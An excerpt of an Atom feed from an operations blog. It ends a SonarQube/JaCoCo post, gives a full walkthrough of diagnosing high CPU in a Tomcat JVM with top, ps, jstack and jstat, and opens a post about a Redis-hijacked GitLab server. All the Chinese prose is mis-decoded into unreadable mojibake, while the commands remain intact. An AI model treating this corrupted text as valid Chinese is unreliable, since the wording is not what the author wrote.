&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;port:å¦‚æœä¸€å°æœºå­æœ‰å¤šä¸ªtomcatï¼Œæ³¨æ„ç«¯å£å·ä¸è¦é‡å¤&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;addressï¼šæœ¬æœºçš„ipåœ°å€&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;å…¶ä»–å‚æ•°ä¸€æ ·ã€‚&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3)é…ç½®å®Œä»¥åï¼Œåˆ°å¯åŠ¨jacoco.shç„¶åæ‰§è¡Œmvn clean packageï¼Œå°±å¯ä»¥åˆ°sonarqubeä¸Šé¢æŸ¥çœ‹æƒ³è¦çš„ä¿¡æ¯äº†ã€‚&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;&lt;p&gt;å‡†å¤‡å·¥ä½œï¼š&lt;code&gt;sonarqubeï¼Œjacocoï¼Œgitï¼Œmavenï¼Œantï¼Œsonar-runner&lt;/code&gt;&lt;br&gt;sonarqube å»å®˜ç½‘ä¸‹è½½ï¼Œæ–‡ä»¶å¤ªå¤§ï¼Œä¸èƒ½ä¸Šä¼ &lt;br&gt;gitï¼Œmavneï¼Œantè‡ªå·±å®‰è£…&lt;br&gt;sonarqubeå’Œson
    
    </summary>
    
      <category term="Java" scheme="http://blog.yangcvo.me/categories/Java/"/>
    
    
      <category term="performance tuning" scheme="http://blog.yangcvo.me/tags/performance-tuning/"/>
    
      <category term="Java" scheme="http://blog.yangcvo.me/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>è®°å½•tomcatè¿›ç¨‹CPUä½¿ç”¨ç‡é«˜æ’æŸ¥æ•…éšœç»éªŒ</title>
    <link href="http://blog.yangcvo.me/2016/12/02/Web%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF/tomcat/%E8%AE%B0%E5%BD%95tomcat%E8%BF%9B%E7%A8%8BCPU%E4%BD%BF%E7%94%A8%E7%8E%87%E9%AB%98%E6%8E%92%E6%9F%A5%E6%95%85%E9%9A%9C%E7%BB%8F%E9%AA%8C/"/>
    <id>http://blog.yangcvo.me/2016/12/02/WebæœåŠ¡æŠ€æœ¯/tomcat/è®°å½•tomcatè¿›ç¨‹CPUä½¿ç”¨ç‡é«˜æ’æŸ¥æ•…éšœç»éªŒ/</id>
    <published>2016-12-02T09:56:03.000Z</published>
    <updated>2017-04-17T09:48:17.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;1ã€æ•…éšœç°è±¡&quot;&gt;&lt;a href=&quot;#1ã€æ•…éšœç°è±¡&quot; class=&quot;headerlink&quot; title=&quot;1ã€æ•…éšœç°è±¡&quot;&gt;&lt;/a&gt;1ã€æ•…éšœç°è±¡&lt;/h3&gt;&lt;p&gt;è¿è¥åŒäº‹åé¦ˆAPPå…¶ä¸­ä½“æ£€å•†åŸè´­ä¹°è®¢å•ç³»ç»Ÿè¿è¡Œç¼“æ…¢ï¼Œè®¿é—®å‡ºç°è¶…æ—¶ï¼Œå¤šæ¬¡é‡å¯ç³»ç»Ÿåé—®é¢˜ä¾ç„¶å­˜åœ¨ï¼Œä½¿ç”¨topå‘½ä»¤æŸ¥çœ‹æœåŠ¡å™¨æƒ…å†µï¼Œå‘ç°CPUå ç”¨ç‡è¿‡é«˜ã€‚&lt;/p&gt;
&lt;h3 id=&quot;2ã€CPUå ç”¨è¿‡é«˜é—®é¢˜å®šä½&quot;&gt;&lt;a href=&quot;#2ã€CPUå ç”¨è¿‡é«˜é—®é¢˜å®šä½&quot; class=&quot;headerlink&quot; title=&quot;2ã€CPUå ç”¨è¿‡é«˜é—®é¢˜å®šä½&quot;&gt;&lt;/a&gt;2ã€CPUå ç”¨è¿‡é«˜é—®é¢˜å®šä½&lt;/h3&gt;&lt;h5 id=&quot;2-1ã€å®šä½é—®é¢˜è¿›ç¨‹&quot;&gt;&lt;a href=&quot;#2-1ã€å®šä½é—®é¢˜è¿›ç¨‹&quot; class=&quot;headerlink&quot; title=&quot;2.1ã€å®šä½é—®é¢˜è¿›ç¨‹&quot;&gt;&lt;/a&gt;2.1ã€å®šä½é—®é¢˜è¿›ç¨‹&lt;/h5&gt;&lt;p&gt;ä½¿ç”¨topå‘½ä»¤æŸ¥çœ‹èµ„æºå ç”¨æƒ…å†µï¼Œå‘ç°pidä¸º14063çš„è¿›ç¨‹å ç”¨äº†å¤§é‡çš„CPUèµ„æºï¼ŒCPUå ç”¨ç‡é«˜è¾¾229.1%ï¼Œå†…å­˜å ç”¨ç‡ä¹Ÿè¾¾åˆ°äº†29.8%&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@account-tomcat-01 ~]$ top&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;top - 14:51:10 up 233 days, 11:40,  2 users,  load average: 6.85, 5.62, 3.97&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Tasks: 192 total,   2 running, 190 sleeping,   0 stopped,   0 zombie&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;%Cpu(s): 97.3 us,  0.3 sy,  0.0 ni,  2.5 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;KiB Mem : 16268652 total,  5114392 free,  6907028 used,  4247232 buff/cache&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;KiB Swap:  4063228 total,  3989708 free,    73520 used.  8751512 avail Mem &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                                                                                               &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14063 root       20   0 9260488 4.627g  11976 S 229.1 29.8 117:41.66 java&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&quot;2-2ã€å®šä½é—®é¢˜çº¿ç¨‹&quot;&gt;&lt;a href=&quot;#2-2ã€å®šä½é—®é¢˜çº¿ç¨‹&quot; class=&quot;headerlink&quot; title=&quot;2.2ã€å®šä½é—®é¢˜çº¿ç¨‹&quot;&gt;&lt;/a&gt;2.2ã€å®šä½é—®é¢˜çº¿ç¨‹&lt;/h5&gt;&lt;p&gt;ä½¿ç”¨&lt;code&gt;ps -mp pid -o THREAD,tid,time&lt;/code&gt;å‘½ä»¤æŸ¥çœ‹è¯¥è¿›ç¨‹çš„çº¿ç¨‹æƒ…å†µï¼Œå‘ç°è¯¥è¿›ç¨‹çš„å¤šä¸ªçº¿ç¨‹å ç”¨ç‡å¾ˆé«˜&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@account-tomcat-01 ~]$ ps -mp 14063 -o THREAD,tid,time &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;USER     %CPU PRI SCNT WCHAN  USER SYSTEM   TID     TIME&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        361   -    - -         -      -     - 02:05:58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root       0.0  19    - futex_    -      - 14063 00:00:00&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root       0.0  19    - poll_s    -      - 14064 00:00:00&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root      44.5  19    - -         -      - 14065 00:15:30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root      44.5  19    - -         -      - 14066 00:15:30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root      44.4  19    - -         -      - 14067 00:15:29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root      44.5  19    - -         -      - 14068 00:15:30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root      44.5  19    - -         -      - 14069 00:15:30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root      44.5  19    - -         -      - 14070 00:15:30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root      44.5  19    - -         -      - 14071 00:15:30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root      44.6  19    - -         -      - 14072 00:15:32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root       2.2  19    - futex_    -      - 14073 00:00:46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root       0.0  19    - futex_    -      - 14074 00:00:00&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root       0.0  19    - futex_    -      - 14075 00:00:00&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root       0.0  19    - futex_    -      - 14076 00:00:00&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root       0.7  19    - futex_    -      - 14077 00:00:15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ä»è¾“å‡ºä¿¡æ¯å¯ä»¥çœ‹å‡ºï¼Œ14065~14072ä¹‹é—´çš„çº¿ç¨‹CPUå ç”¨ç‡éƒ½å¾ˆé«˜&lt;br&gt;2.3ã€æŸ¥çœ‹é—®é¢˜çº¿ç¨‹å †æ ˆ&lt;/p&gt;
&lt;p&gt;æŒ‘é€‰TIDä¸º14065çš„çº¿ç¨‹ï¼ŒæŸ¥çœ‹è¯¥çº¿ç¨‹çš„å †æ ˆæƒ…å†µï¼Œå…ˆå°†çº¿ç¨‹idè½¬ä¸º16è¿›åˆ¶ï¼Œä½¿ç”¨printf â€œ%x\nâ€ tidå‘½ä»¤è¿›è¡Œè½¬æ¢&lt;/p&gt;
&lt;figure class=&quot;highlight nix&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@account-tomcat-&lt;span class=&quot;number&quot;&gt;01&lt;/span&gt; ~]$ printf &lt;span class=&quot;string&quot;&gt;&quot;%x\n&quot;&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;14065&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;36&lt;/span&gt;f1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;å†ä½¿ç”¨jstackå‘½ä»¤æ‰“å°çº¿ç¨‹å †æ ˆä¿¡æ¯ï¼Œå‘½ä»¤æ ¼å¼ï¼šjstack pid |grep tid -A &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@root-web-&lt;span class=&quot;number&quot;&gt;01&lt;/span&gt; ~]$ jstack &lt;span class=&quot;number&quot;&gt;14063&lt;/span&gt; |grep &lt;span class=&quot;number&quot;&gt;36&lt;/span&gt;f1 -A &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;GC task thread#0 (ParallelGC)&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;prio=10&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;tid=0x00007fa35001e800&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;nid=0x36f1&lt;/span&gt; runnable &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;GC task thread#1 (ParallelGC)&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;prio=10&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;tid=0x00007fa350020800&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;nid=0x36f2&lt;/span&gt; runnable &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;GC task thread#2 (ParallelGC)&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;prio=10&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;tid=0x00007fa350022800&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;nid=0x36f3&lt;/span&gt; runnable &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;GC task thread#3 (ParallelGC)&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;prio=10&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;tid=0x00007fa350024000&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;nid=0x36f4&lt;/span&gt; runnable &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;GC task thread#4 (ParallelGC)&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;prio=10&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;tid=0x00007fa350026000&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;nid=0x36f5&lt;/span&gt; runnable &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;GC task thread#5 (ParallelGC)&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;prio=10&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;tid=0x00007fa350028000&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;nid=0x36f6&lt;/span&gt; runnable &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;GC task thread#6 (ParallelGC)&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;prio=10&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;tid=0x00007fa350029800&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;nid=0x36f7&lt;/span&gt; runnable &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;GC task thread#7 (ParallelGC)&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;prio=10&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;tid=0x00007fa35002b800&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;nid=0x36f8&lt;/span&gt; runnable &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;VM Periodic Task Thread&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;prio=10&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;tid=0x00007fa3500a8800&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;nid=0x3700&lt;/span&gt; waiting on condition &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;JNI global references: &lt;span class=&quot;number&quot;&gt;392&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ä»è¾“å‡ºä¿¡æ¯å¯ä»¥çœ‹å‡ºï¼Œæ­¤çº¿ç¨‹æ˜¯JVMçš„gcçº¿ç¨‹ã€‚æ­¤æ—¶å¯ä»¥åŸºæœ¬ç¡®å®šæ˜¯å†…å­˜ä¸è¶³æˆ–å†…å­˜æ³„éœ²å¯¼è‡´gcçº¿ç¨‹æŒç»­è¿è¡Œï¼Œå¯¼è‡´CPUå ç”¨è¿‡é«˜ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬è¦æ‰¾çš„å†…å­˜æ–¹é¢çš„é—®é¢˜&lt;/p&gt;
&lt;p&gt;3.1ã€ä½¿ç”¨jstat -gcutilå‘½ä»¤æŸ¥çœ‹è¿›ç¨‹çš„å†…å­˜æƒ…å†µ&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@account-tomcat-01 ~]$ jstat -gcutil 14063 2000 10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  S0     S1     E      O      P     YGC     YGCT    FGC    FGCT     GCT   &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   218 1484.830 1506.747&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   218 1484.830 1506.747&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   219 1496.567 1518.484&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   219 1496.567 1518.484&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   219 1496.567 1518.484&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   219 1496.567 1518.484&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   219 1496.567 1518.484&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   220 1505.439 1527.355&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   220 1505.439 1527.355&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   220 1505.439 1527.355&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ä»è¾“å‡ºä¿¡æ¯å¯ä»¥çœ‹å‡ºï¼ŒEdenåŒºå†…å­˜å ç”¨100%ï¼ŒOldåŒºå†…å­˜å ç”¨99.99%ï¼ŒFull GCçš„æ¬¡æ•°é«˜è¾¾220æ¬¡ï¼Œå¹¶ä¸”é¢‘ç¹Full GCï¼ŒFull GCçš„æŒç»­æ—¶é—´ä¹Ÿç‰¹åˆ«é•¿ï¼Œå¹³å‡æ¯æ¬¡Full GCè€—æ—¶6.8ç§’ï¼ˆ1505.439/220ï¼‰ã€‚æ ¹æ®è¿™äº›ä¿¡æ¯ï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šæ˜¯ç¨‹åºä»£ç ä¸Šå‡ºç°äº†é—®é¢˜ï¼Œå¯èƒ½å­˜åœ¨ä¸åˆç†åˆ›å»ºå¯¹è±¡çš„åœ°æ–¹ã€‚&lt;/p&gt;
&lt;p&gt;ç”Ÿäº§javaåº”ç”¨ï¼ŒCPUä½¿ç”¨ç‡ä¸€ç›´å¾ˆé«˜ï¼Œç»å¸¸è¾¾åˆ°100%ï¼Œé€šè¿‡ä»¥ä¸‹æ­¥éª¤å®Œç¾è§£å†³ï¼Œåˆ†äº«ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1.jps è·å–Javaè¿›ç¨‹çš„PIDã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2.top -H -p PID æŸ¥çœ‹å¯¹åº”è¿›ç¨‹çš„å“ªä¸ªçº¿ç¨‹å ç”¨CPUè¿‡é«˜ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2.1 ä½¿ç”¨ ps -mp pid -o THREAD,tid,time å‘½ä»¤æŸ¥çœ‹è¯¥è¿›ç¨‹çš„çº¿ç¨‹æƒ…å†µï¼Œå‘ç°è¯¥è¿›ç¨‹çš„å¤šä¸ªçº¿ç¨‹å ç”¨ç‡å¾ˆé«˜ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3.jstack pid &amp;gt;&amp;gt; java.txt å¯¼å‡ºCPUå ç”¨é«˜è¿›ç¨‹çš„çº¿ç¨‹æ ˆã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ä½¿ç”¨jstackå‘½ä»¤æŸ¥çœ‹è¿›ç¨‹çš„å †æ ˆæƒ…å†µ&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4.echo â€œobase=16; PIDâ€ | bc å°†çº¿ç¨‹çš„PIDè½¬æ¢ä¸º16è¿›åˆ¶ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5.åœ¨ç¬¬äºŒæ­¥å¯¼å‡ºçš„Java.txtä¸­æŸ¥æ‰¾è½¬æ¢æˆä¸º16è¿›åˆ¶çš„çº¿ç¨‹PIDã€‚æ‰¾åˆ°å¯¹åº”çš„çº¿ç¨‹æ ˆã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6.åˆ†æè´Ÿè½½é«˜çš„çº¿ç¨‹æ ˆéƒ½æ˜¯ä»€ä¹ˆä¸šåŠ¡æ“ä½œã€‚ä¼˜åŒ–ç¨‹åºå¹¶å¤„ç†é—®é¢˜ã€‚&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1ã€æ•…éšœç°è±¡&quot;&gt;&lt;a href=&quot;#1ã€æ•…éšœç°è±¡&quot; class=&quot;headerlink&quot; title=&quot;1ã€æ•…éšœç°è±¡&quot;&gt;&lt;/a&gt;1ã€æ•…éšœç°è±¡&lt;/h3&gt;&lt;p&gt;è¿è¥åŒäº‹åé¦ˆAPPå…¶ä¸­ä½“æ£€å•†åŸè´­ä¹°è®¢å•ç³»ç»Ÿè¿è¡Œç¼“æ…¢ï¼Œè®¿é—®å‡ºç°è¶…æ—¶ï¼Œå¤šæ¬¡é‡å¯ç³»ç»Ÿåé—®é¢˜ä¾ç„¶å­˜åœ¨ï¼Œä½¿ç”¨topå‘½ä»¤
    
    </summary>
    
      <category term="Java" scheme="http://blog.yangcvo.me/categories/Java/"/>
    
    
      <category term="performance tuning" scheme="http://blog.yangcvo.me/tags/performance-tuning/"/>
    
      <category term="Java" scheme="http://blog.yangcvo.me/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>gitlabç½‘ç«™è¢«é»‘redisè¢«åŠ«æŒ6379ç«¯å£éœ€è¦æäº¤è®¤è¯ï¼Œå¦‚ä½•æŒ½æ•‘ï¼Ÿ</title>
    <link href="http://blog.yangcvo.me/2016/12/02/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/gitlab%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91redis%E8%A2%AB%E5%8A%AB%E6%8C%816379%E7%AB%AF%E5%8F%A3%E9%9C%80%E8%A6%81%E6%8F%90%E4%BA%A4%E8%AE%A4%E8%AF%81%EF%BC%8C%E5%A6%82%E4%BD%95%E6%8C%BD%E6%95%91%EF%BC%9F/"/>
    <id>http://blog.yangcvo.me/2016/12/02/è¿ç»´å®‰å…¨/gitlabç½‘ç«™è¢«é»‘redisè¢«åŠ«æŒ6379ç«¯å£éœ€è¦æäº¤è®¤è¯ï¼Œå¦‚ä½•æŒ½æ•‘ï¼Ÿ/</id>
    <published>2016-12-02T04:07:27.000Z</published>
    <updated>2017-03-14T05:53:06.000Z</updated>
    
    <content type="html">&lt;p&gt;ä»Šå¤©æ—©ä¸Š5ç‚¹å¤šæ”¶åˆ°é˜¿é‡Œäº‘çš„å‘Šè­¦ï¼šæœåŠ¡å™¨CPUç™¾åˆ†ç™¾ï¼ŒgitlabæœåŠ¡å™¨è®¿é—®å‡ºç°500ï¼Œç¬¬ä¸€æ—¶é—´æ’æŸ¥é—®é¢˜ã€‚&lt;br&gt;æ¯•ç«Ÿè¿™ä¸ªå…³ä¹ç€å¼€å‘ä»Šå¤©å¯èƒ½æ— æ³•æäº¤ä»£ç ã€‚&lt;/p&gt;
